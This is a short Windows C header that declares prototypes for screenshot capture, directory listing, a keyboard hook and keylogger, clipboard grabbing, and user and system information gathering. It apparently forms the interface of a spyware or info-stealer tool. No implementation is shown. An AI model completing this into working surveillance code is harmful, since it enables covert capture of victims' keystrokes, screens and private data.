#include <Windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <stdio.h>

#define DIV 10737418

void screenshot();
PBITMAPINFO createBitmapInfo(HBITMAP hBmp);
void createBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP, HDC hD);

int listDir(STRSAFE_LPCWSTR path, STRSAFE_LPCWSTR files, STRSAFE_LPCWSTR recursive, int level);
int list();

LRESULT CALLBACK keyboardHook(int, WPARAM, LPARAM);
void keylogger();

void clipboard();

void getUserInfo();
void getMemoryUsage();
void getSystemInfo();